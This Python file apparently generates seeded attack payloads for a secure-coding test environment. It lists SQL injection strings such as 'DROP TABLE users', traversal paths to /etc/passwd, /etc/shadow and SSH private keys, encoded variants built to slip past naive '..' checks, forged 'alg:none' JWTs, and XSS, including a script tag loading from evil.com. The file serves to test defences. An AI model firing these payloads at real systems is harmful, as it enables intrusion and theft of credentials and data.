"""
SecureCodeEnv - Attack Payload Generator v3
FIXED: Every seed now GUARANTEES URL-encoded + absolute-path payloads
so that naive string-only checks (if '..' in path) always fail.
"""
import random
import urllib.parse

# Payloads split by bypass class so we always sample from each class
PAYLOAD_CLASSES = {
    "injection": {
        "basic": [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "admin'--",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
        ],
        "union": [
            "1 UNION SELECT * FROM passwords--",
            "1 UNION SELECT null,null,null--",
            "' UNION SELECT username,password FROM users--",
        ],
        "stacked": [
            "1; SELECT * FROM information_schema.tables",
            "'; INSERT INTO users VALUES('hacked','hacked')--",
        ],
        "comment_variants": [
            "admin'/*",
            "' OR 'x'='x'; --",
            "1 OR 1=1#",
        ],
    },
    "traversal": {
        # CRITICAL: class "dot_dot" uses literal ".." - naive check catches these
        "dot_dot": [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "....//....//etc/passwd",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
        ],
        # CRITICAL: class "encoded" bypasses naive ".." string check
        "encoded": [
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2F..%2Fetc%2Fpasswd",
            "%252e%252e%252fetc%252fpasswd",
            "..%252f..%252fetc%252fpasswd",
        ],
        # CRITICAL: class "absolute" - no ".." at all, bypasses string check
        "absolute": [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "/proc/self/environ",
        ],
        "null_byte": [
            "/etc/passwd%00",
            "../etc/passwd\x00.jpg",
            "%00/etc/passwd",
        ],
    },
    "auth_bypass": {
        "none_alg": [
            '{"alg":"none"}.payload.',
            'eyJhbGciOiJub25lIn0.payload.',
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciJ9.',
        ],
        "expired": [
            '{"exp":1000}.payload.',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxMDAwfQ.fake',
        ],
        "tampered": [
            'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.TAMPERED',
            'null',
            '',
            'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.fake_rs256',
        ],
    },
    "xss": {
        "script": [
            "<script>alert('xss')</script>",
            "<script src='http://evil.com/x.js'></script>",
            "</script><script>alert(1)</script>",
        ],
        "event": [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
        ],
        "protocol": [
            "javascript:alert(1)",
            "vbscript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
        "template": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
        ],
    },
}


def get_payloads(attack_type: str, seed: int, count: int = 8) -> list[str]:
    """
    Returns seeded-random payloads GUARANTEED to include all bypass classes.
    
    For traversal: always includes encoded + absolute payloads so that
    naive '..' string checks always fail on some payloads.
    
    count: total payloads. Each class gets floor(count / n_classes) samples.
    """
    rng = random.Random(seed)
    classes = PAYLOAD_CLASSES.get(attack_type, {})
    if not classes:
        return []

    result = []
    class_names = list(classes.keys())
    per_class = max(1, count // len(class_names))
    remainder = count - per_class * len(class_names)

    # Sample from EVERY class — guarantees coverage of all bypass techniques
    for cls_name in class_names:
        pool = classes[cls_name]
        n = per_class + (1 if remainder > 0 else 0)
        remainder -= 1
        selected = rng.sample(pool, min(n, len(pool)))
        result.extend(selected)

    # Apply mutations to half the payloads
    mutated = [_mutate(p, rng) for p in result[len(result)//2:]]
    final = result[:len(result)//2] + mutated

    rng.shuffle(final)
    return final[:count]


def _mutate(payload: str, rng: random.Random) -> str:
    """Apply 1-2 evasion mutations."""
    ops = [
        lambda p: p.upper() if rng.random() > 0.5 else p,
        lambda p: p + rng.choice(["", " ", " --", " #"]),
        lambda p: p.replace("../", "..//") if "../" in p else p,
        lambda p: urllib.parse.quote(p[:len(p)//2]) + p[len(p)//2:] if p else p,
        lambda p: p.replace("'", "\u02bc") if "'" in p else p,
    ]
    for op in rng.sample(ops, min(2, len(ops))):
        try:
            payload = op(payload)
        except Exception:
            pass
    return payload
